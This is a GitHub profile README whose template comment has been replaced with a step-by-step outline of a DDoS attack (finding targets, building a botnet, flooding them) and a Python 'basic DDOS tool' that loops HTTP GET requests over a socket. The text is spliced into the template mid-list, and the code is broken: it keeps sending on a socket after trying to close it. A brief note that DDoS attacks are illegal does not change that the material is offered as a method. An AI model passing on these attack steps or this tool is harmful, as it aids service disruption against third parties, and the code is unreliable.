### Hi there 👋

<!--
**FroxxStone/FroxxStone** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.

Here are some ideas to get you started:

- 1. The attacker obtains an IP address and port to use as the target. This can be done through searching or by remotely scanning for vulnerable targets. 

2. The attacker builds a “botnet”, or a set of computers that can be controlled by a single person, and uses this to send large amounts of traffic to the target IP address and port. 

3. The attacker sends all of this traffic to the target IP address and port at the same time, resulting in the webserver or application becoming overloaded and unable to respond to requests. 

4. The attacker continues to attack the target until it becomes unavailable or unreachable. 

It is important to note that DDoS attacks are illegal in most jurisdictions, and should not be attempted without permission.A basic DDOS tool can be created using Python.
Python provides a very powerful library “socket” which can be used to create a basic DDOS tool.


import socket

#Define target
target = "www.example.com"

#create a socket
# AF_INET refers to the address family ipv4
# SOCK_STREAM means connection oriented TCP protocol
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect to the target
client.connect((target, 80))

# send some data
# Since we are using TCP the connection remains open until we close it with client.close()
client.send("GET / HTTP/1.1\r\nHost: "+target+"\r\n\r\n")

# recieve some data
response = client.recv(4096)

# close the connection
client.close

# repeat the request many times
while True:
	client.send("GET / HTTP/1.1\r\nHost: "+target+"\r\n\r\n")
	response = client.recv(4096)
